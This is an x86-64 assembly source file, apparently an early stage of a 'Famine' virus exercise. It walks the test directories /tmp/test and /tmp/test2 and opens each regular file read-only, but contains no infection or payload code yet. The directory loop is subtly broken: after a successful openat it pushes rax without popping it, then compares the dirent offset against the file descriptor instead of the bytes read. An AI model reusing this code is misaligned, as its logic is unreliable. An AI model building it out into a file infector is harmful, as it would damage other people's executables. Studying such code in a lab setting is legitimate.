%include "inc/famine.inc"

default rel

section .text
    ; Trazas
    hello db            "[+] Hello",10,0  ;11

    global _start
    dirs db         "/tmp/test",0,"/tmp/test2",0,0

    _start:

    mov rbp, rsp
    sub rbp, famine_size            ;generate stack

    ;load dirs
    lea rdi, [dirs]  
    
    .open_dir:
        ; rdi = dir name pointer
        mov r14, rdi
        mov VAR(famine.dir_name_pointer), rdi
        cmp byte [rdi], 0
        je .exit
        mov rax, SC_OPEN
        mov rsi, O_RDONLY | O_DIRECTORY
        syscall
        test rax, rax
        jl .next_dir
        mov VAR(famine.fd_dir), rax

        .dirent:
            mov rax, SC_GETDENTS
            mov rdi, VAR(famine.fd_dir)
            lea rsi, VAR(famine.dirent_struc)
            mov rdx, 1024
            syscall
            test rax, rax
            jle .close_dir
            xor r12, r12            

        ; rdi = dirent_struct[0]
        ; r12 = offset to dirent_struc node
        ; rax = total bytes read in getdents
        .validate_files_types:
            lea rdi, VAR(famine.dirent_struc)
            add rdi, r12
            movzx edx, word [rdi + dirent.d_len]
            add r12, rdx
            cmp byte [rdi + rdx - 1], REGULAR_FILE
            jne .next_file
            add rdi, dirent.d_name

            .openat:
                push rax
                lea rsi, [rdi]
                mov rdi, VAR(famine.fd_dir)
                mov rdx, O_RDONLY
                mov rax, SC_OPENAT
                xor r10, r10
                syscall
                test rax, rax
                jle .end_openat
                mov VAR(famine.fd_file), rax
                jmp .next_file

            .end_openat:
                pop rax
                jmp .next_file

        .next_file:
            cmp r12, rax
            jb .validate_files_types

        .close_dir:
            mov rax, SC_CLOSE
            mov rdi, VAR(famine.fd_dir)
            syscall

        .next_dir:
            mov rsi, r14
        
        .find_null:
            lodsb               ; al = *rsi++
            test al, al
            jnz .find_null

            mov rdi, rsi
            cmp byte [rdi], 0   ; find double null
            jnz .open_dir

        .exit:
            mov rax, SC_EXIT
            syscall
    
    